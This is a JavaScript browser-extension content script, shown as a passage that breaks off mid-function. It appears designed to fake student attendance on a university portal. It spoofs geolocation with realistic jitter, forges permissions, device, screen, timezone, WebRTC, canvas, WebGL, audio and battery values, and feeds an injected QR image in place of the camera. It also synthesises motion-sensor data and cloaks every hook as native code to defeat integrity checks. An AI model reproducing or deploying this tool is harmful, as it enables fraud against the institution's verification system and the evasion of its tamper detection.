/**
 * content.js — MAIN world, document_start
 *
 * Stealth Level: Maximum
 *   - Native caching defeats late DOM-spy hooks
 *   - Function.prototype.toString cloaking defeats prototype integrity checks
 *   - Sensor fusion: DeviceMotion/Orientation at 60fps
 *   - Per-install randomized bridge event names (defeats signature matching)
 *   - Device accuracy profiles (defeats static telemetry fingerprinting)
 *   - Adaptive geofence centroid placement
 *   - OTP peer relay via configurable KV endpoint
 *   - QR dynamic auto-inject from sniffed API payload
 *   - Race-condition burst submission
 *   - Header injection for campus IP camouflage
 *   - Request timing jitter for behavioral normalization
 */

(function () {
  'use strict';

  // Fast bail-out on private infrastructure IPs (router, NAS, Proxmox)
  const host = window.location.hostname;
  if (/^(?:10\.|192\.168\.|172\.(?:1[6-9]|2[0-9]|3[01])\.)/.test(host)) {
    return;
  }

  // ── Phase 1: Native Function Caching ─────────────────────────────────────
  const _addEventListener    = window.addEventListener.bind(window);
  const _removeEventListener = window.removeEventListener.bind(window);
  const _dispatchEvent       = window.dispatchEvent.bind(window);
  const _CustomEvent         = CustomEvent;
  const _setTimeout          = setTimeout;
  const _clearTimeout        = clearTimeout;
  const _setInterval         = setInterval;
  const _clearInterval       = clearInterval;
  const _origFetch           = window.fetch ? window.fetch.bind(window) : null;
  const _origXHROpen         = XMLHttpRequest.prototype.open;
  const _origXHRSend         = XMLHttpRequest.prototype.send;
  const _origXHRSetHeader    = XMLHttpRequest.prototype.setRequestHeader;

  const _geoProto               = Geolocation.prototype;
  const _origGetCurrentPosition = _geoProto.getCurrentPosition;
  const _origWatchPosition      = _geoProto.watchPosition;
  const _origClearWatch         = _geoProto.clearWatch;

  // ── Phase 2: .toString() Cloaking ────────────────────────────────────────
  const _origFnToString = Function.prototype.toString;
  const _nativeStringMap = new Map();

  let _inToString = false;
  const _toStringProxy = new Proxy(_origFnToString, {
    apply(target, thisArg, args) {
      if (thisArg === _toStringProxy || thisArg === _origFnToString) {
        return 'function toString() { [native code] }';
      }
      if (_inToString) return Reflect.apply(target, thisArg, args);
      _inToString = true;
      try {
        if (_nativeStringMap.has(thisArg)) return _nativeStringMap.get(thisArg);
        return Reflect.apply(target, thisArg, args);
      } finally {
        _inToString = false;
      }
    }
  });

  _nativeStringMap.set(_toStringProxy, 'function toString() { [native code] }');
  _nativeStringMap.set(_origFnToString, 'function toString() { [native code] }');
  try { Function.prototype.toString = _toStringProxy; } catch (_) {}

  function _cloak(fn, nativeStr) { _nativeStringMap.set(fn, nativeStr); }

  // ── Secure State ─────────────────────────────────────────────────────────
  let currentConfig  = null;
  const _fakeWatchIds  = new Set();
  const watchIntervals = new Map();
  const activeDrifts   = new Map();

  // ── Accuracy Profile Definitions ──────────────────────────────────────────
  const ACCURACY_PROFILES = {
    mobile_gps: {
      accuracyMin: 4,   accuracyMax: 10,
      altAccuracyMin: 6, altAccuracyMax: 12,
      altitudeM: 7.5,   altitudeDelta: 1.2,
    },
    desktop: {
      accuracyMin: 20,  accuracyMax: 40,
      altAccuracyMin: 25, altAccuracyMax: 50,
      altitudeM: 10,    altitudeDelta: 3,
    },
    low_signal: {
      accuracyMin: 50,  accuracyMax: 120,
      altAccuracyMin: 60, altAccuracyMax: 150,
      altitudeM: 7.5,   altitudeDelta: 5,
    },
  };

  function getProfile() {
    const key = (currentConfig && currentConfig.profile) || 'mobile_gps';
    return ACCURACY_PROFILES[key] || ACCURACY_PROFILES.mobile_gps;
  }

  // Diagnostic whitelist
  const DIAGNOSTIC_DOMAINS = [
    'browserleaks.com', 'html5demos.com', 'my-location.org',
    'w3schools.com', 'where-am-i.org', 'localhost', '127.0.0.1'
  ];

  function isDomainAllowed(hostname, targetDomain, testMode) {
    if (testMode === true) return true;
    if (!hostname) return false;
    if (targetDomain && (hostname === targetDomain || hostname.endsWith('.' + targetDomain))) return true;
    for (let i = 0; i < DIAGNOSTIC_DOMAINS.length; i++) {
      const d = DIAGNOSTIC_DOMAINS[i];
      if (hostname === d || hostname.endsWith('.' + d)) return true;
    }
    return false;
  }

  function getSpoofConfig() {
    if (!currentConfig) return null;
    const targetDomain = currentConfig.targetDomain || 'portal.university.edu';
    if (!isDomainAllowed(window.location.hostname, targetDomain, currentConfig.testMode)) return null;
    if (currentConfig.enabled && currentConfig.lat !== null && currentConfig.lng !== null) {
      return currentConfig;
    }
    return null;
  }

  // ── Position Builders ──────────────────────────────────────────────────────
  function coordJitter() {
    const u = 1 - Math.random();
    const v = 1 - Math.random();
    const n = Math.sqrt(-2.0 * Math.log(u)) * Math.cos(2.0 * Math.PI * v);
    return n * 0.000015;
  }

  // Adaptive jitter based on geofence radius — tighter radius = tighter jitter
  function coordJitterAdaptive(radiusM) {
    if (!radiusM || radiusM <= 0) return coordJitter();
    // 1 meter ≈ 0.000009 degrees. Place within 60% of declared radius
    const deg = (radiusM * 0.000009) * 0.6;
    const u = 1 - Math.random();
    const v = 1 - Math.random();
    const n = Math.sqrt(-2.0 * Math.log(u)) * Math.cos(2.0 * Math.PI * v);
    return n * (deg / 3);
  }

  function buildPosition(lat, lng, radiusM) {
    const p = getProfile();
    const accuracy         = p.accuracyMin + Math.random() * (p.accuracyMax - p.accuracyMin);
    const altitudeAccuracy = p.altAccuracyMin + Math.random() * (p.altAccuracyMax - p.altAccuracyMin);
    const altitude         = p.altitudeM + (Math.random() * p.altitudeDelta * 2 - p.altitudeDelta);
    const jitterFn = radiusM ? coordJitterAdaptive.bind(null, radiusM) : coordJitter;
    const isMobile = currentConfig && (currentConfig.deviceMode === 'android' || currentConfig.deviceMode === 'ios');
    const speed = isMobile ? (Math.random() < 0.6 ? 0 : parseFloat((Math.random() * 0.05).toFixed(2))) : null;
    const heading = (speed && speed > 0) ? Math.round(Math.random() * 360) : null;
    return {
      coords: {
        latitude:         parseFloat(lat) + jitterFn(),
        longitude:        parseFloat(lng) + jitterFn(),
        altitude:         altitude,
        accuracy:         Math.round(accuracy),
        altitudeAccuracy: Math.round(altitudeAccuracy),
        heading:          heading,
        speed:            speed,
      },
      timestamp: Date.now(),
    };
  }

  function getRealisticDelay() {
    // Fast GPS fix for responsive UI (50–120ms) so portal hook (b.T) resolves coordinates immediately
    return 50 + Math.random() * 70;
  }

  function simulateKineticDrift(baseLat, baseLng, watchId) {
    if (!activeDrifts.has(watchId)) {
      activeDrifts.set(watchId, {
        lat: parseFloat(baseLat),
        lng: parseFloat(baseLng),
        lastTs: Date.now() - 3000,
        heading: Math.floor(Math.random() * 360)
      });
    }
    const current = activeDrifts.get(watchId);
    const prevLat = current.lat;
    const prevLng = current.lng;
    const prevTs  = current.lastTs || (Date.now() - 2500);
    const now     = Date.now();
    const dtSec   = Math.max(0.5, (now - prevTs) / 1000);

    // Coupled Brownian drift displacement
    const drift = (Math.random() - 0.5) * 0.000015;
    current.lat += drift * (0.8 + Math.random() * 0.4);
    current.lng += drift * (0.7 + Math.random() * 0.6);
    current.lastTs = now;

    // Haversine delta for speed calculation
    const dLat = (current.lat - prevLat) * (Math.PI / 180);
    const dLng = (current.lng - prevLng) * (Math.PI / 180);
    const a = Math.sin(dLat / 2) ** 2 + Math.cos(prevLat * (Math.PI / 180)) * Math.cos(current.lat * (Math.PI / 180)) * Math.sin(dLng / 2) ** 2;
    const distM = 6371000 * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
    const rawSpeed = distM / dtSec;
    const speed = parseFloat(Math.min(1.2, Math.max(0.04, rawSpeed)).toFixed(2));

    // True bearing calculation in degrees [0, 360)
    const y = Math.sin(dLng) * Math.cos(current.lat * (Math.PI / 180));
    const x = Math.cos(prevLat * (Math.PI / 180)) * Math.sin(current.lat * (Math.PI / 180)) -
              Math.sin(prevLat * (Math.PI / 180)) * Math.cos(current.lat * (Math.PI / 180)) * Math.cos(dLng);
    const bearing = (Math.atan2(y, x) * 180 / Math.PI + 360) % 360;
    current.heading = Math.round(bearing);

    const p       = getProfile();
    const accuracy = p.accuracyMin + Math.random() * (p.accuracyMax - p.accuracyMin);

    return {
      coords: {
        latitude:         current.lat,
        longitude:        current.lng,
        altitude:         p.altitudeM + (Math.random() * p.altitudeDelta * 2 - p.altitudeDelta),
        accuracy:         Math.round(accuracy),
        altitudeAccuracy: Math.round(p.altAccuracyMin + Math.random() * (p.altAccuracyMax - p.altAccuracyMin)),
        heading:          current.heading,
        speed:            speed,
      },
      timestamp: now,
    };
  }

  // ── Telemetry Helper ──────────────────────────────────────────────────────
  function _sendSubmitTelemetry(lat, lng) {
    try {
      const payload = {
        type: 'PRESENSI_SUBMIT', lat: String(lat), lng: String(lng),
        profile: (currentConfig && currentConfig.profile) || 'mobile_gps',
        ts: Date.now()
      };
      _dispatchEvent(new _CustomEvent('__gps_telemetry_msg', { detail: JSON.stringify(payload) }));
    } catch (_) {}
  }

  let _resultSent = false;
  function _sendResultTelemetry(status) {
    if (_resultSent) return;
    _resultSent = true;
    try {
      const payload = { type: 'PRESENSI_RESULT', status, ts: Date.now() };
      _dispatchEvent(new _CustomEvent('__gps_telemetry_msg', { detail: JSON.stringify(payload) }));
    } catch (_) {}
  }

  // ── Geolocation Proxy Hooks ────────────────────────────────────────────────
  const getCurrentPositionProxy = new Proxy(_origGetCurrentPosition, {
    apply(target, thisArg, argumentsList) {
      const cfg = getSpoofConfig();
      if (cfg) {
        const [successCallback] = argumentsList;
        _setTimeout(() => {
          const pos = buildPosition(cfg.lat, cfg.lng, cfg._geofenceRadius);
          if (typeof successCallback === 'function') successCallback(pos);
        }, getRealisticDelay());
      } else {
        return Reflect.apply(target, thisArg, argumentsList);
      }
    }
  });

  const watchPositionProxy = new Proxy(_origWatchPosition, {
    apply(target, thisArg, argumentsList) {
      const cfg = getSpoofConfig();
      if (cfg) {
        const [successCallback] = argumentsList;
        const fakeId = Math.floor(Math.random() * 999999) + 1;
        _fakeWatchIds.add(fakeId);
        _setTimeout(() => {
          if (_fakeWatchIds.has(fakeId) && typeof successCallback === 'function') {
            successCallback(simulateKineticDrift(cfg.lat, cfg.lng, fakeId));
            const driftInterval = _setInterval(() => {
              if (_fakeWatchIds.has(fakeId)) {
                successCallback(simulateKineticDrift(cfg.lat, cfg.lng, fakeId));
              } else {
                _clearInterval(driftInterval);
                watchIntervals.delete(fakeId);
              }
            }, 2000 + Math.random() * 3000);
            watchIntervals.set(fakeId, driftInterval);
          }
        }, getRealisticDelay());
        return fakeId;
      } else {
        return Reflect.apply(target, thisArg, argumentsList);
      }
    }
  });

  const clearWatchProxy = new Proxy(_origClearWatch, {
    apply(target, thisArg, argumentsList) {
      const [watchId] = argumentsList;
      if (_fakeWatchIds.has(watchId)) {
        _fakeWatchIds.delete(watchId);
        activeDrifts.delete(watchId);
        if (watchIntervals.has(watchId)) {
          _clearInterval(watchIntervals.get(watchId));
          watchIntervals.delete(watchId);
        }
        return;
      }
      return Reflect.apply(target, thisArg, argumentsList);
    }
  });

  _cloak(getCurrentPositionProxy, 'function getCurrentPosition() { [native code] }');
  _cloak(watchPositionProxy,      'function watchPosition() { [native code] }');
  _cloak(clearWatchProxy,         'function clearWatch() { [native code] }');
  _cloak(_toStringProxy,          'function toString() { [native code] }');

  try {
    _geoProto.getCurrentPosition = getCurrentPositionProxy;
    _geoProto.watchPosition      = watchPositionProxy;
    _geoProto.clearWatch         = clearWatchProxy;
  } catch (_) {}

  // Permissions API: return 'granted' for geolocation when spoofing
  if (navigator.permissions && typeof navigator.permissions.query === 'function') {
    const _origPermissionsQuery = navigator.permissions.query.bind(navigator.permissions);
    const permissionsQueryProxy = new Proxy(_origPermissionsQuery, {
      apply(target, thisArg, args) {
        const [descriptor] = args;
        if (descriptor && descriptor.name === 'geolocation' && getSpoofConfig()) {
          const fakeStatus = {
            state: 'granted', name: 'geolocation', onchange: null,
            addEventListener: function() {}, removeEventListener: function() {},
            dispatchEvent: function() { return true; }
          };
          if (typeof PermissionStatus !== 'undefined') {
            Object.setPrototypeOf(fakeStatus, PermissionStatus.prototype);
          }
          return Promise.resolve(fakeStatus);
        }
        return Reflect.apply(target, thisArg, args);
      }
    });
    _cloak(permissionsQueryProxy, 'function query() { [native code] }');
    try { navigator.permissions.query = permissionsQueryProxy; } catch (_) {}
  }

  // ── Device Spoofing ────────────────────────────────────────────────────────
  function applyDeviceSpoofing(deviceMode) {
    if (!deviceMode || deviceMode === 'desktop') return;
    let vendor = '', platform = '', touch = 0;
    if (deviceMode === 'android') {
      vendor = 'Google Inc.'; platform = 'Linux armv8l'; touch = 5;
    } else if (deviceMode === 'ios') {
      vendor = 'Apple Computer, Inc.'; platform = 'iPhone'; touch = 5;
    }
    try {
      if (vendor)   Object.defineProperty(navigator, 'vendor',         { get: () => vendor, configurable: true });
      if (platform) Object.defineProperty(navigator, 'platform',       { get: () => platform, configurable: true });
      if (touch)    Object.defineProperty(navigator, 'maxTouchPoints',  { get: () => touch, configurable: true });

      // Network Information API emulation
      const conn = {
        downlink: 10.5,
        effectiveType: '4g',
        rtt: 55,
        saveData: false,
        type: 'cellular',
        onchange: null,
        addEventListener: function() {},
        removeEventListener: function() {},
        dispatchEvent: function() { return true; }
      };
      Object.defineProperty(navigator, 'connection', { get: () => conn, configurable: true });

      // User-Agent Client Hints (UA-CH) emulation
      if (deviceMode === 'android') {
        const uad = {
          brands: [
            { brand: 'Chromium', version: '112' },
            { brand: 'Google Chrome', version: '112' },
            { brand: 'Not:A-Brand', version: '99' }
          ],
          mobile: true,
          platform: 'Android',
          getHighEntropyValues: function() {
            return Promise.resolve({
              architecture: 'arm',
              bitness: '64',
              brands: [
                { brand: 'Chromium', version: '112' },
                { brand: 'Google Chrome', version: '112' },
                { brand: 'Not:A-Brand', version: '99' }
              ],
              mobile: true,
              model: 'SM-S918B',
              platform: 'Android',
              platformVersion: '13',
              uaFullVersion: '112.0.0.0'
            });
          },
          toJSON: function() {
            return { brands: this.brands, mobile: true, platform: 'Android' };
          }
        };
        _cloak(uad.getHighEntropyValues, 'function getHighEntropyValues() { [native code] }');
        Object.defineProperty(navigator, 'userAgentData', { get: () => uad, configurable: true });
      } else if (deviceMode === 'ios') {
        // iOS Safari does not define userAgentData
        Object.defineProperty(navigator, 'userAgentData', { get: () => undefined, configurable: true });
      }

      // Screen & Orientation emulation
      const screenW = deviceMode === 'ios' ? 393 : 412;
      const screenH = deviceMode === 'ios' ? 852 : 915;
      Object.defineProperty(screen, 'width',       { get: () => screenW, configurable: true });
      Object.defineProperty(screen, 'height',      { get: () => screenH, configurable: true });
      Object.defineProperty(screen, 'availWidth',  { get: () => screenW, configurable: true });
      Object.defineProperty(screen, 'availHeight', { get: () => screenH - 48, configurable: true });

      if (screen.orientation) {
        const fakeOrient = {
          angle: 0,
          type: 'portrait-primary',
          onchange: null,
          addEventListener: function() {},
          removeEventListener: function() {},
          dispatchEvent: function() { return true; },
          lock: function() { return Promise.resolve(); },
          unlock: function() {}
        };
        _cloak(fakeOrient.lock, 'function lock() { [native code] }');
        _cloak(fakeOrient.unlock, 'function unlock() { [native code] }');
        Object.defineProperty(screen, 'orientation', { get: () => fakeOrient, configurable: true });
      }
      Object.defineProperty(window, 'orientation', { get: () => 0, configurable: true });
    } catch (_) {}
  }

  // ── Phase 2.5: Maximum Stealth Anti-Fingerprinting ────────────────────────

  // 1. Timezone Lock
  const _origGetTimezoneOffset = Date.prototype.getTimezoneOffset;
  const _tzOffsetProxy = new Proxy(_origGetTimezoneOffset, {
    apply(target, thisArg, args) {
      if (getSpoofConfig()) return -420;
      return Reflect.apply(target, thisArg, args);
    }
  });
  _cloak(_tzOffsetProxy, 'function getTimezoneOffset() { [native code] }');
  try { Date.prototype.getTimezoneOffset = _tzOffsetProxy; } catch (_) {}

  if (window.Intl && Intl.DateTimeFormat) {
    const _origResolvedOptions = Intl.DateTimeFormat.prototype.resolvedOptions;
    const _resolvedOptionsProxy = new Proxy(_origResolvedOptions, {
      apply(target, thisArg, args) {
        const opts = Reflect.apply(target, thisArg, args);
        if (getSpoofConfig()) return Object.assign({}, opts, { timeZone: 'Asia/Jakarta' });
        return opts;
      }
    });
    _cloak(_resolvedOptionsProxy, 'function resolvedOptions() { [native code] }');
    try { Intl.DateTimeFormat.prototype.resolvedOptions = _resolvedOptionsProxy; } catch (_) {}
  }

  // 2. WebRTC IP Leak Protection
  if (window.RTCPeerConnection) {
    const _origRTCPeerConnection = window.RTCPeerConnection;
    const RTCPeerConnectionProxy = new Proxy(_origRTCPeerConnection, {
      construct(target, args) {
        const pc = new target(...args);
        if (getSpoofConfig()) {
          const _origAdd = pc.addEventListener.bind(pc);
          pc.addEventListener = function(type, listener, options) {
            if (type === 'icecandidate' && typeof listener === 'function') {
              const wrapped = function(event) {
                if (event && event.candidate && event.candidate.candidate) {
                  const c = event.candidate.candidate;
                  if (/(?:10\.|192\.168\.|172\.(?:1[6-9]|2[0-9]|3[01])\.)/.test(c)) return;
                }
                return listener.apply(this, arguments);
              };
              return _origAdd(type, wrapped, options);
            }
            return _origAdd(type, listener, options);
          };
          let _customIceHandler = null;
          try {
            Object.defineProperty(pc, 'onicecandidate', {
              get: () => _customIceHandler,
              set: (fn) => {
                if (typeof fn === 'function') {
                  _customIceHandler = function(event) {
                    if (event && event.candidate && event.candidate.candidate) {
                      const c = event.candidate.candidate;
                      if (/(?:10\.|192\.168\.|172\.(?:1[6-9]|2[0-9]|3[01])\.)/.test(c)) return;
                    }
                    return fn.apply(this, arguments);
                  };
                } else { _customIceHandler = fn; }
              },
              configurable: true, enumerable: true
            });
          } catch (_) {}
        }
        return pc;
      }
    });
    _cloak(RTCPeerConnectionProxy, 'function RTCPeerConnection() { [native code] }');
    try {
      window.RTCPeerConnection = RTCPeerConnectionProxy;
      if (window.webkitRTCPeerConnection) window.webkitRTCPeerConnection = RTCPeerConnectionProxy;
    } catch (_) {}
  }

  // 3. Canvas & WebGL Micro-Noise
  if (window.CanvasRenderingContext2D && CanvasRenderingContext2D.prototype.getImageData) {
    const _origGetImageData = CanvasRenderingContext2D.prototype.getImageData;
    const getImageDataProxy = new Proxy(_origGetImageData, {
      apply(target, thisArg, args) {
        const imgData = Reflect.apply(target, thisArg, args);
        if (getSpoofConfig() && imgData && imgData.data && imgData.data.length >= 4) {
          imgData.data[0] = (imgData.data[0] ^ 1) & 0xFF;
        }
        return imgData;
      }
    });
    _cloak(getImageDataProxy, 'function getImageData() { [native code] }');
    try { CanvasRenderingContext2D.prototype.getImageData = getImageDataProxy; } catch (_) {}
  }

  if (window.HTMLCanvasElement && HTMLCanvasElement.prototype.toDataURL) {
    const _origToDataURL = HTMLCanvasElement.prototype.toDataURL;
    const toDataURLProxy = new Proxy(_origToDataURL, {
      apply(target, thisArg, args) {
        if (getSpoofConfig()) {
          try {
            if (thisArg.width > 0 && thisArg.width <= 256 && thisArg.height > 0 && thisArg.height <= 256) {
              const ctx = thisArg.getContext('2d');
              if (ctx) {
                const pixel = ctx.getImageData(0, 0, 1, 1);
                if (pixel && pixel.data) {
                  pixel.data[0] = (pixel.data[0] ^ 1) & 0xFF;
                  ctx.putImageData(pixel, 0, 0);
                }
              }
            }
          } catch (_) {}
        }
        return Reflect.apply(target, thisArg, args);
      }
    });
    _cloak(toDataURLProxy, 'function toDataURL() { [native code] }');
    try { HTMLCanvasElement.prototype.toDataURL = toDataURLProxy; } catch (_) {}
  }

  function _patchWebGLContext(proto) {
    if (!proto || !proto.getParameter) return;
    const _origGetParam = proto.getParameter;
    const getParamProxy = new Proxy(_origGetParam, {
      apply(target, thisArg, args) {
        const param = args[0];
        const cfg = getSpoofConfig();
        if (cfg) {
          if (param === 37445) return cfg.deviceMode === 'ios' ? 'Apple Inc.' : 'Google Inc. (NVIDIA)';
          if (param === 37446) return cfg.deviceMode === 'ios' ? 'Apple GPU' : 'ANGLE (NVIDIA, NVIDIA GeForce RTX 3060 Direct3D11 vs_5_0 ps_5_0, D3D11)';
        }
        return Reflect.apply(target, thisArg, args);
      }
    });
    _cloak(getParamProxy, 'function getParameter() { [native code] }');
    try { proto.getParameter = getParamProxy; } catch (_) {}
  }
  if (window.WebGLRenderingContext)  _patchWebGLContext(WebGLRenderingContext.prototype);
  if (window.WebGL2RenderingContext) _patchWebGLContext(WebGL2RenderingContext.prototype);

  // 3b. OffscreenCanvas Micro-Noise
  if (typeof OffscreenCanvas !== 'undefined' && OffscreenCanvas.prototype && OffscreenCanvas.prototype.convertToBlob) {
    const _origConvertToBlob = OffscreenCanvas.prototype.convertToBlob;
    const convertToBlobProxy = new Proxy(_origConvertToBlob, {
      apply(target, thisArg, args) {
        if (getSpoofConfig()) {
          try {
            const ctx = thisArg.getContext('2d');
            if (ctx) {
              const pixel = ctx.getImageData(0, 0, 1, 1);
              if (pixel && pixel.data) {
                pixel.data[0] = (pixel.data[0] ^ 1) & 0xFF;
                ctx.putImageData(pixel, 0, 0);
              }
            }
          } catch (_) {}
        }
        return Reflect.apply(target, thisArg, args);
      }
    });
    _cloak(convertToBlobProxy, 'function convertToBlob() { [native code] }');
    try { OffscreenCanvas.prototype.convertToBlob = convertToBlobProxy; } catch (_) {}
  }

  // 3c. OfflineAudioContext Micro-Jitter (Anti-Audio Fingerprinting)
  if (typeof OfflineAudioContext !== 'undefined' && OfflineAudioContext.prototype) {
    const _origStartRendering = OfflineAudioContext.prototype.startRendering;
    const startRenderingProxy = new Proxy(_origStartRendering, {
      apply(target, thisArg, args) {
        return Reflect.apply(target, thisArg, args).then((audioBuffer) => {
          if (getSpoofConfig() && audioBuffer) {
            try {
              for (let c = 0; c < audioBuffer.numberOfChannels; c++) {
                const data = audioBuffer.getChannelData(c);
                if (data && data.length > 100) {
                  for (let i = 50; i < Math.min(data.length, 500); i += 25) {
                    data[i] += (Math.random() - 0.5) * 0.000002;
                  }
                }
              }
            } catch (_) {}
          }
          return audioBuffer;
        });
      }
    });
    _cloak(startRenderingProxy, 'function startRendering() { [native code] }');
    try { OfflineAudioContext.prototype.startRendering = startRenderingProxy; } catch (_) {}
  }

  // 4. Hardware Concurrency, Device Memory & Battery
  try {
    Object.defineProperty(navigator, 'hardwareConcurrency', {
      get: () => {
        const cfg = getSpoofConfig();
        if (cfg && (cfg.deviceMode === 'android' || cfg.deviceMode === 'ios')) return 4;
        return 8;
      },
      configurable: true
    });
    Object.defineProperty(navigator, 'deviceMemory', { get: () => 8, configurable: true });
  } catch (_) {}

  const _sessionStartTs = Date.now();
  if (navigator.getBattery) {
    const _origGetBattery = navigator.getBattery.bind(navigator);
    const getBatteryProxy = new Proxy(_origGetBattery, {
      apply(target, thisArg, args) {
        if (getSpoofConfig()) {
          const cfg = getSpoofConfig();
          const isMobile = cfg && (cfg.deviceMode === 'android' || cfg.deviceMode === 'ios');
          const elapsedMinutes = (Date.now() - _sessionStartTs) / 60000;
          const baseLevel = 0.85 - (elapsedMinutes * 0.003);
          const level = Math.max(0.25, Math.min(0.95, baseLevel));
          return Promise.resolve({
            charging: !isMobile,
            chargingTime: isMobile ? Infinity : 1800,
            dischargingTime: isMobile ? 14400 : Infinity,
            level: parseFloat(level.toFixed(2)),
            onchargingchange: null, onchargingtimechange: null,
            ondischargingtimechange: null, onlevelchange: null,
            addEventListener: function() {}, removeEventListener: function() {},
            dispatchEvent: function() { return true; }
          });
        }
        return Reflect.apply(target, thisArg, args);
      }
    });
    _cloak(getBatteryProxy, 'function getBattery() { [native code] }');
    try { navigator.getBattery = getBatteryProxy; } catch (_) {}
  }

  // ── Phase 2.6: Virtual Camera & Attendance QR Injector ────────────────────
  let _virtualQrImage = null;

  function setVirtualQrImage(src) {
    if (!src) { _virtualQrImage = null; return; }
    const img = new Image();
    img.crossOrigin = 'anonymous';
    img.onload = () => { _virtualQrImage = img; };
    img.src = src;
  }

  function _createSyntheticQrStream(img) {
    const canvas = document.createElement('canvas');
    canvas.width = 640; canvas.height = 480;
    const ctx = canvas.getContext('2d');
    function drawFrame() {
      if (!_virtualQrImage) return;
      ctx.fillStyle = '#FFFFFF';
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      const aspect = img.width / img.height;
      let drawW = canvas.width * 0.7;
      let drawH = drawW / aspect;
      if (drawH > canvas.height * 0.7) { drawH = canvas.height * 0.7; drawW = drawH * aspect; }
      const x = (canvas.width - drawW) / 2;
      const y = (canvas.height - drawH) / 2;
      ctx.drawImage(img, x, y, drawW, drawH);
    }
    drawFrame();
    _setInterval(drawFrame, 100);
    return canvas.captureStream ? canvas.captureStream(15) : null;
  }

  if (navigator.mediaDevices && typeof navigator.mediaDevices.getUserMedia === 'function') {
    const _origGetUserMedia = navigator.mediaDevices.getUserMedia.bind(navigator.mediaDevices);
    const getUserMediaProxy = new Proxy(_origGetUserMedia, {
      apply(target, thisArg, args) {
        const constraints = args[0];
        if (getSpoofConfig() && _virtualQrImage && constraints && (constraints.video || typeof constraints === 'object')) {
          try {
            const stream = _createSyntheticQrStream(_virtualQrImage);
            if (stream) return Promise.resolve(stream);
          } catch (_) {}
        }
        return Reflect.apply(target, thisArg, args);
      }
    });
    _cloak(getUserMediaProxy, 'function getUserMedia() { [native code] }');
    try { navigator.mediaDevices.getUserMedia = getUserMediaProxy; } catch (_) {}
  }

  // ── Phase 3: Sensor Fusion Spoofing & Physiological Tremor ────────────────
  let _sensorSpoofActive     = false;
  let _motionIntervalId      = null;
  let _orientationIntervalId = null;
  let _userOnDeviceMotion    = null;
  let _userOnDeviceOrientation = null;

  function _buildMotionEvent() {
    const t = Date.now();
    // Hand tremor (9-11 Hz) + respiration sway (0.25 Hz)
    const breath = Math.sin(t / 4000) * 0.08;
    const tremorX = Math.sin(t / 95) * 0.05 + (Math.random() - 0.5) * 0.03;
    const tremorY = Math.cos(t / 105) * 0.05 + (Math.random() - 0.5) * 0.03;
    const tremorZ = Math.sin(t / 115) * 0.04 + (Math.random() - 0.5) * 0.02;

    // Upright handheld posture (~54° pitch):
    // ax ≈ 0.15 + tremorX, ay ≈ 7.85 + breath + tremorY, az ≈ 5.80 + tremorZ
    return {
      acceleration: {
        x: tremorX,
        y: tremorY,
        z: tremorZ,
      },
      accelerationIncludingGravity: {
        x: 0.15 + tremorX,
        y: 7.85 + breath + tremorY,
        z: 5.80 + tremorZ,
      },
      rotationRate: {
        alpha: Math.sin(t / 200) * 0.2 + (Math.random() - 0.5) * 0.1,
        beta:  Math.cos(t / 180) * 0.2 + (Math.random() - 0.5) * 0.1,
        gamma: Math.sin(t / 220) * 0.15 + (Math.random() - 0.5) * 0.1,
      },
      interval: 16.67,
    };
  }

  function _buildOrientationEvent() {
    const t = Date.now();
    const driftAlpha = (t / 1000) % 360;
    const swayBeta = Math.sin(t / 2500) * 0.8 + Math.sin(t / 100) * 0.2;
    const swayGamma = Math.cos(t / 3000) * 0.5 + Math.sin(t / 110) * 0.15;
    return {
      alpha:    driftAlpha,
      beta:     53 + swayBeta,
      gamma:    -2.5 + swayGamma,
      absolute: false,
    };
  }

  function _dispatchFakeSensorEvents() {
    const motionData      = _buildMotionEvent();
    const orientationData = _buildOrientationEvent();
    try {
      const motionEvent = new DeviceMotionEvent('devicemotion', {
        acceleration:                motionData.acceleration,
        accelerationIncludingGravity: motionData.accelerationIncludingGravity,
        rotationRate:                motionData.rotationRate,
        interval:                    motionData.interval,
      });
      _dispatchEvent(motionEvent);
      if (typeof _userOnDeviceMotion === 'function') {
        try { _userOnDeviceMotion(motionEvent); } catch (_) {}
      }
    } catch (_) {}
    try {
      const orientEvent = new DeviceOrientationEvent('deviceorientation', {
        alpha: orientationData.alpha, beta: orientationData.beta,
        gamma: orientationData.gamma, absolute: orientationData.absolute,
      });
      _dispatchEvent(orientEvent);
      if (typeof _userOnDeviceOrientation === 'function') {
        try { _userOnDeviceOrientation(orientEvent); } catch (_) {}
      }
    } catch (_) {}
  }

  try {
    Object.defineProperty(window, 'ondevicemotion', {
      get: () => _userOnDeviceMotion,
      set: (fn) => {
        _userOnDeviceMotion = fn;
        if (fn && getSpoofConfig() && !_sensorSpoofActive) {
          _sensorSpoofActive = true;
          _motionIntervalId  = _setInterval(_dispatchFakeSensorEvents, 16);
        }
      },
      configurable: true
    });
    Object.defineProperty(window, 'ondeviceorientation', {
      get: () => _userOnDeviceOrientation,
      set: (fn) => {
        _userOnDeviceOrientation = fn;
        if (fn && getSpoofConfig() && !_sensorSpoofActive) {
          _sensorSpoofActive = true;
          _motionIntervalId  = _setInterval(_dispatchFakeSensorEvents, 16);
        }
      },
      configurable: true
    });
  } catch (_) {}

  // iOS Safari Permission API Cloaking
  try {
    if (typeof DeviceMotionEvent !== 'undefined' && typeof DeviceMotionEvent.requestPermission !== 'function') {
      DeviceMotionEvent.requestPermission = function() { return Promise.resolve('granted'); };
      _cloak(DeviceMotionEvent.requestPermission, 'function requestPermission() { [native code] }');
    }
    if (typeof DeviceOrientationEvent !== 'undefined' && typeof DeviceOrientationEvent.requestPermission !== 'function') {
      DeviceOrientationEvent.requestPermission = function() { return Promise.resolve('granted'); };
      _cloak(DeviceOrientationEvent.requestPermission, 'function requestPermission() { [native code] }');
    }
  } catch (_) {}

  // Generic Sensor API Emulation (Accelerometer, LinearAccelerationSensor, Gyroscope)
  function _createSyntheticSensorClass(BaseClass, sensorType) {
    if (!BaseClass) return null;
    function SyntheticSensor(options) {
      const self = this;
      self.activated = false;
      self.hasReading = false;
      self.timestamp = null;
      self.x = 0; self.y = 0; self.z = 0;
      self._sensorInterval = null;
      self.start = function() {
        if (!getSpoofConfig()) return;
        self.activated = true;
        self.hasReading = true;
        if (self._sensorInterval) _clearInterval(self._sensorInterval);
        self._sensorInterval = _setInterval(() => {
          const m = _buildMotionEvent();
          self.timestamp = performance.now();
          if (sensorType === 'accel') {
            self.x = m.accelerationIncludingGravity.x;
            self.y = m.accelerationIncludingGravity.y;
            self.z = m.accelerationIncludingGravity.z;
          } else if (sensorType === 'linear') {
